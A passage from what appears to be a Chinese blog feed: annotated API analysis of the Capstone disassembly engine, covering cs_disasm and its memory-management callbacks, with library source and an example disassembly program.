(cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; cs_strerror(cs_errno(handle));  <span class="comment">//直接输出报错信息</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/22/5d35bc1db170a33360.jpg" alt></p><h3 id="cs-disasm"><a href="#cs-disasm" class="headerlink" title="cs_disasm"></a>cs_disasm</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> <span class="function">CAPSTONE_API <span class="title">cs_disasm</span><span class="params">(csh handle,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">uint8_t</span> *code, <span class="keyword">size_t</span> code_size,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">uint64_t</span> address,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_insn **insn)</span></span>;</span><br></pre></td></tr></table></figure><p>给定缓冲区、大小、地址和编号，反编译机器码<br>API动态地分配内存来包含分解的指令，生成的指令将放在*insn中</p><p>注意： 必须释放分配的内存，以避免内存泄漏。对于需要动态分配稀缺内存的系统(如OS内核或固件)，API cs_disasm_iter()可能是比cs_disasm()更好的选择。原因是，使用cs_disasm()时，基于有限的可用内存，必须预先计算要分解多少条指令。</p><p>handle: cs_open()返回的句柄<br>code: 包含要反汇编的机器码的缓冲区。<br>code_size:上面代码缓冲区的大小。<br>address:给定原始代码缓冲区中的第一条指令的地址。<br>insn: 由这个API填写的指令数组。注意: insn将由这个函数分配，应该用cs_free () API释放<br>count: 需要分解的指令数量，或输入0分解所有指令<br>return:成功反汇编指令的数量，如果该函数未能反汇编给定的代码，则为0，失败时，调用cs_errno()获取错误代码。</p><p>源码分析</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> <span class="function">CAPSTONE_API <span class="title">cs_disasm</span><span class="params">(csh ud, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *buffer, <span class="keyword">size_t</span> size, <span class="keyword">uint64_t</span> offset, <span class="keyword">size_t</span> count, cs_insn **insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line">MCInst mci;</span><br><span class="line"><span class="keyword">uint16_t</span> insn_size;</span><br><span class="line"><span class="keyword">size_t</span> c = <span class="number">0</span>, i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> f = <span class="number">0</span>;<span class="comment">// 缓存中下一条指令的索引</span></span><br><span class="line">cs_insn *insn_cache;<span class="comment">// 缓存反汇编后的指令</span></span><br><span class="line"><span class="keyword">void</span> *total = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> total_size = <span class="number">0</span>;<span class="comment">//所有insn的输出缓冲区的总大小</span></span><br><span class="line"><span class="keyword">bool</span> r;</span><br><span class="line"><span class="keyword">void</span> *tmp;</span><br><span class="line"><span class="keyword">size_t</span> skipdata_bytes;</span><br><span class="line"><span class="keyword">uint64_t</span> offset_org; <span class="comment">// 保存缓冲区的所有原始信息</span></span><br><span class="line"><span class="keyword">size_t</span> size_org;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> *buffer_org;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cache_size = INSN_CACHE_SIZE;</span><br><span class="line"><span class="keyword">size_t</span> next_offset;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"><span class="keyword">if</span> (!handle) &#123;</span><br><span class="line"><span class="comment">// 修复方式:</span></span><br><span class="line"><span class="comment">// handle-&gt;errnum = CS_ERR_HANDLE;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重设ARM架构的IT block</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;arch == CS_ARCH_ARM)</span><br><span class="line">handle-&gt;ITBlock.size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_USE_SYS_DYN_MEM</span></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span> &amp;&amp; count &lt;= INSN_CACHE_SIZE)</span><br><span class="line">cache_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>) count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存SKIPDATA原始偏移量</span></span><br><span class="line">buffer_org = buffer;</span><br><span class="line">offset_org = offset;</span><br><span class="line">size_org = size;</span><br><span class="line"></span><br><span class="line">total_size = <span class="keyword">sizeof</span>(cs_insn) * cache_size;</span><br><span class="line">total = cs_mem_malloc(total_size);</span><br><span class="line"><span class="keyword">if</span> (total == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">// 内存不足</span></span><br><span class="line">handle-&gt;errnum = CS_ERR_MEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">insn_cache = total;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">MCInst_Init(&amp;mci);</span><br><span class="line">mci.csh = handle;</span><br><span class="line"></span><br><span class="line">mci.address = offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line"><span class="comment">//给detail指针分配内存</span></span><br><span class="line">insn_cache-&gt;detail = cs_mem_malloc(<span class="keyword">sizeof</span>(cs_detail));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">insn_cache-&gt;detail = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为non-detailed模式保存所有信息</span></span><br><span class="line">mci.flat_insn = insn_cache;</span><br><span class="line">mci.flat_insn-&gt;address = offset;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line"><span class="comment">//mnemonic &amp; op_str0填充</span></span><br><span class="line">mci.flat_insn-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">mci.flat_insn-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">r = handle-&gt;disasm(ud, buffer, size, &amp;mci, &amp;insn_size, offset, handle-&gt;getinsn_info);</span><br><span class="line"><span class="keyword">if</span> (r) &#123;</span><br><span class="line">SStream ss;</span><br><span class="line">SStream_Init(&amp;ss);</span><br><span class="line"></span><br><span class="line">mci.flat_insn-&gt;size = insn_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将内部指令操作码映射到公共insn ID</span></span><br><span class="line">handle-&gt;insn_id(handle, insn_cache, mci.Opcode);</span><br><span class="line"></span><br><span class="line">handle-&gt;printer(&amp;mci, &amp;ss, handle-&gt;printer_info);</span><br><span class="line">fill_insn(handle, insn_cache, ss.buffer, &amp;mci, handle-&gt;post_printer, buffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调整opcode (X86)</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;arch == CS_ARCH_X86)</span><br><span class="line">insn_cache-&gt;id += mci.popcode_adjust;</span><br><span class="line"></span><br><span class="line">next_offset = insn_size;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 遇到中断指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为detail指针释放内存</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line">cs_mem_free(insn_cache-&gt;detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;skipdata || handle-&gt;skipdata_size &gt; size)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;skipdata_setup.callback) &#123;</span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_setup.callback(buffer_org, size_org,</span><br><span class="line">(<span class="keyword">size_t</span>)(offset - offset_org), handle-&gt;skipdata_setup.user_data);</span><br><span class="line"><span class="keyword">if</span> (skipdata_bytes &gt; size)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!skipdata_bytes)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">skipdata_bytes = handle-&gt;skipdata_size;</span><br><span class="line"></span><br><span class="line">insn_cache-&gt;id = <span class="number">0</span>;</span><br><span class="line">insn_cache-&gt;address = offset;</span><br><span class="line">insn_cache-&gt;size = (<span class="keyword">uint16_t</span>)skipdata_bytes;</span><br><span class="line"><span class="built_in">memcpy</span>(insn_cache-&gt;bytes, buffer, skipdata_bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line">insn_cache-&gt;mnemonic[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">insn_cache-&gt;op_str[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="built_in">strncpy</span>(insn_cache-&gt;mnemonic, handle-&gt;skipdata_setup.mnemonic,</span><br><span class="line"><span class="keyword">sizeof</span>(insn_cache-&gt;mnemonic) - <span class="number">1</span>);</span><br><span class="line">skipdata_opstr(insn_cache-&gt;op_str, buffer, skipdata_bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">insn_cache-&gt;detail = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">next_offset = skipdata_bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一条新指令进入缓存</span></span><br><span class="line">f++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反汇编了一条指令</span></span><br><span class="line">c++;</span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span> &amp;&amp; c == count)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f == cache_size) &#123;</span><br><span class="line">cache_size = cache_size * <span class="number">8</span> / <span class="number">5</span>; </span><br><span class="line">total_size += (<span class="keyword">sizeof</span>(cs_insn) * cache_size);</span><br><span class="line">tmp = cs_mem_realloc(total, total_size);</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) &#123;<span class="comment">//内存不足</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line">insn_cache = (cs_insn *)total;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; c; i++, insn_cache++)</span><br><span class="line">cs_mem_free(insn_cache-&gt;detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_mem_free(total);</span><br><span class="line">*insn = <span class="literal">NULL</span>;</span><br><span class="line">handle-&gt;errnum = CS_ERR_MEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">total = tmp;</span><br><span class="line"><span class="comment">//在最后一条指令之后继续填充缓存</span></span><br><span class="line">insn_cache = (cs_insn *)((<span class="keyword">char</span> *)total + <span class="keyword">sizeof</span>(cs_insn) * c);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将f重置为0，从一开始就填入缓存</span></span><br><span class="line">f = <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">insn_cache++;</span><br><span class="line"></span><br><span class="line">buffer += next_offset;</span><br><span class="line">size -= next_offset;</span><br><span class="line">offset += next_offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!c) &#123;</span><br><span class="line"><span class="comment">//未反汇编任何指令</span></span><br><span class="line">cs_mem_free(total);</span><br><span class="line">total = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (f != cache_size) &#123;</span><br><span class="line"><span class="comment">// 没有完全使用最后一个缓存，缩小大小</span></span><br><span class="line">tmp = cs_mem_realloc(total, total_size - (cache_size - f) * <span class="keyword">sizeof</span>(*insn_cache));</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="literal">NULL</span>) &#123;<span class="comment">// 内存不足</span></span><br><span class="line"><span class="comment">// 释放所有detail指针</span></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;detail) &#123;</span><br><span class="line">insn_cache = (cs_insn *)total;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; c; i++, insn_cache++)</span><br><span class="line">cs_mem_free(insn_cache-&gt;detail);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_mem_free(total);</span><br><span class="line">*insn = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_MEM;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">total = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*insn = total;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例，x86_64:<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle = <span class="number">0</span>;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);   <span class="comment">//所有指令，基址0x1000，放入insn</span></span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disassemble given code!\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出</p><p><img src="https://i.loli.net/2019/07/22/5d35c5087d17d31194.jpg" alt></p><p>From <a href="https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(三">https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(三)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-三&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-三&quot; class=&quot;headerlink&quot; title=&quot;Capstone反汇编引擎数据类型及API分析及示例(三)&quot;&gt;&lt;/a&gt;C
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(二)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%BA%8C)/"/>
    <id>https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(二)/</id>
    <published>2019-07-21T04:55:52.086Z</published>
    <updated>2019-07-27T02:17:41.475Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-二"><a href="#Capstone反汇编引擎数据类型及API分析及示例-二" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(二)"></a>Capstone反汇编引擎数据类型及API分析及示例(二)</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5761" target="_blank" rel="noopener">https://xz.aliyun.com/t/5761</a></p></blockquote><p>上篇分析了Capstone开放的数据类型，下面就来正式看看API吧<br>官方开放的API只有二十个左右，但为了能写的更易懂，我将结合实例，分多篇写。<br>API中作者将capstone缩写为cs，下面我也用这种方式描述</p><h2 id="API分析"><a href="#API分析" class="headerlink" title="API分析"></a>API分析</h2><h3 id="cs-malloc-t"><a href="#cs-malloc-t" class="headerlink" title="cs_malloc_t"></a>cs_malloc_t</h3><p><code>void* (CAPSTONE_API *cs_malloc_t)(size_t size);</code></p><p>cs的动态内存分配，用于<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mem</span> &#123;</span></span><br><span class="line"><span class="keyword">cs_malloc_t</span> <span class="built_in">malloc</span>;</span><br><span class="line"><span class="keyword">cs_calloc_t</span> <span class="built_in">calloc</span>;</span><br><span class="line"><span class="keyword">cs_realloc_t</span> <span class="built_in">realloc</span>;</span><br><span class="line"><span class="keyword">cs_free_t</span> <span class="built_in">free</span>;</span><br><span class="line"><span class="keyword">cs_vsnprintf_t</span> vsnprintf;</span><br><span class="line">&#125; cs_opt_mem;</span><br></pre></td></tr></table></figure></p><p>cs_malloc_t定义于capstone.lib和capstone.dll的cs.c中，<br><img src="https://i.loli.net/2019/07/21/5d33f804831d248926.jpg" alt></p><blockquote><p>在用户模式下，cs_mem_malloc默认使用系统malloc</p><p>Windows driver模式下，<code>cs_malloc_t cs_mem_malloc = cs_winkernel_malloc;</code><br>cs_winkernel_malloc定义于\capstone-4.0.1\windows\winkernel_mm.c,</p></blockquote><p>实现代码<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * CAPSTONE_API <span class="title">cs_winkernel_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 长度不能分配为0</span></span><br><span class="line">NT_ASSERT(size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// FP; NonPagedPool用于支持 Windows 7 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> prefast(suppress : 30030)<span class="comment">// 分配可执行的POOL_TYPE内存</span></span></span><br><span class="line"><span class="keyword">size_t</span> number_of_bytes = <span class="number">0</span>;</span><br><span class="line">CS_WINKERNEL_MEMBLOCK *block = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 特定的值能造成溢出</span></span><br><span class="line"><span class="comment">// 如果value中的和超出或低于类型容量，函数将返回NULL。</span></span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(RtlSizeTAdd(size, <span class="keyword">sizeof</span>(CS_WINKERNEL_MEMBLOCK), &amp;number_of_bytes))) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">block = (CS_WINKERNEL_MEMBLOCK *)ExAllocatePoolWithTag(</span><br><span class="line">NonPagedPool, number_of_bytes, CS_WINKERNEL_POOL_TAG);</span><br><span class="line"><span class="keyword">if</span> (!block) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">block-&gt;size = size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> block-&gt;data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>OSX kernel模式下，<code>cs_malloc_t cs_mem_malloc = kern_os_malloc;</code>，这里暂且不探讨。</p></blockquote><h3 id="cs-calloc-t"><a href="#cs-calloc-t" class="headerlink" title="cs_calloc_t"></a>cs_calloc_t</h3><p><code>void* (CAPSTONE_API *cs_calloc_t)(size_t nmemb, size_t size);</code></p><p>cs申请内存并初始化<br>用于<code>struct cs_opt_mem</code>，定义于cs.c<br>用户模式： <code>cs_calloc_t cs_mem_calloc = calloc;</code>,使用系统calloc<br>Windows driver模式： <code>cs_calloc_t cs_mem_calloc = cs_winkernel_calloc;</code><br>实现代码</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * CAPSTONE_API <span class="title">cs_winkernel_calloc</span><span class="params">(<span class="keyword">size_t</span> n, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> total = n * size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *new_ptr = cs_winkernel_malloc(total);</span><br><span class="line"><span class="keyword">if</span> (!new_ptr) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> RtlFillMemory(new_ptr, total, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OSX kernel模式： <code>cs_calloc_t cs_mem_calloc = cs_kern_os_calloc;</code><br><img src="https://i.loli.net/2019/07/21/5d340703367d259403.jpg" alt><br>直接调用kern_os_malloc了</p><h3 id="cs-realloc-t"><a href="#cs-realloc-t" class="headerlink" title="cs_realloc_t"></a>cs_realloc_t</h3><p><code>void* (CAPSTONE_API *cs_realloc_t)(void *ptr, size_t size);</code></p><p>cs重新分配内存<br>用于<code>struct cs_opt_mem</code>，定义于cs.c<br>用户模式： <code>cs_realloc_t cs_mem_realloc = realloc;</code>,调用系统realloc<br>Windows driver模式： <code>cs_realloc_t cs_mem_realloc = cs_winkernel_realloc;</code></p><p>实现代码，可以看出是利用cs_winkernel_malloc重新申请</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * CAPSTONE_API <span class="title">cs_winkernel_realloc</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span> current_size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> smaller_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ptr) &#123;</span><br><span class="line"><span class="keyword">return</span> cs_winkernel_malloc(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_ptr = cs_winkernel_malloc(size);</span><br><span class="line"><span class="keyword">if</span> (!new_ptr) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">current_size = CONTAINING_RECORD(ptr, CS_WINKERNEL_MEMBLOCK, data)-&gt;size;</span><br><span class="line">smaller_size = (current_size &lt; size) ? current_size : size;</span><br><span class="line">RtlCopyMemory(new_ptr, ptr, smaller_size);</span><br><span class="line">cs_winkernel_free(ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> new_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OSX kernel模式： <code>cs_realloc_t cs_mem_realloc = kern_os_realloc;</code></p><h3 id="cs-free-t"><a href="#cs-free-t" class="headerlink" title="cs_free_t"></a>cs_free_t</h3><p><code>typedef void (CAPSTONE_API *cs_free_t)(void *ptr);</code></p><p>cs释放内存<br>用于<code>struct cs_opt_mem</code>，定义于cs.c<br>用户模式： <code>cs_free_t cs_mem_free = free;</code>,调用系统free<br>Windows driver模式： <code>cs_free_t cs_mem_free = cs_winkernel_free;</code></p><p>实现代码<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> CAPSTONE_API <span class="title">cs_winkernel_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">ExFreePoolWithTag(CONTAINING_RECORD(ptr, CS_WINKERNEL_MEMBLOCK, data), CS_WINKERNEL_POOL_TAG);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>OSX kernel模式：  <code>cs_free_t cs_mem_free = kern_os_free;</code></p><h3 id="cs-vsnprintf-t"><a href="#cs-vsnprintf-t" class="headerlink" title="cs_vsnprintf_t"></a>cs_vsnprintf_t</h3><p><code>int (CAPSTONE_API *cs_vsnprintf_t)(char *str, size_t size, const char *format, va_list ap);</code></p><p>按size大小输出到字符串str中</p><p>用户模式：<br><img src="https://i.loli.net/2019/07/21/5d340c613ba1e61273.jpg" alt><br>值得注意的是，如果系统为wince，将使用_vsnprintf函数<br>vsnprintf ()和_vsnprintf()对于驱动程序都是可用的，但是它们有一些不同。<br>在需要返回值和设置空终止符时应使用vsnprintf()</p><p>vsnprintf定义在stdio.h<br><img src="https://i.loli.net/2019/07/21/5d340d423babc62961.jpg" alt></p><p>Windows driver模式： <code>cs_vsnprintf_t cs_vsnprintf = cs_winkernel_vsnprintf;</code></p><p>代码实现</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> CAPSTONE_API <span class="title">cs_winkernel_vsnprintf</span><span class="params">(<span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> count, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list argptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> result = _vsnprintf(buffer, count, format, argptr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// _vsnprintf()在字符串被截断时返回-1，在整个字符串被存储但“buffer”末尾没有“\0”时返回“count”。在这两种情况下，都需要手动添加空终止符。</span></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">-1</span> || (<span class="keyword">size_t</span>)result == count) &#123;</span><br><span class="line">buffer[count - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="comment">// 在返回-1时，函数必须获取并返回一些本来要写入的字符。因此，通过重试使用temp buffer进行相同的转换，这个缓冲区就可能足够大来完成格式化，并且获得很多本应写入的字符。</span></span><br><span class="line"><span class="keyword">char</span>* tmp = cs_winkernel_malloc(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">if</span> (!tmp) &#123;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result = _vsnprintf(tmp, <span class="number">0x1000</span>, format, argptr);</span><br><span class="line">NT_ASSERT(result != <span class="number">-1</span>);</span><br><span class="line">cs_winkernel_free(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OSX kernel模式： 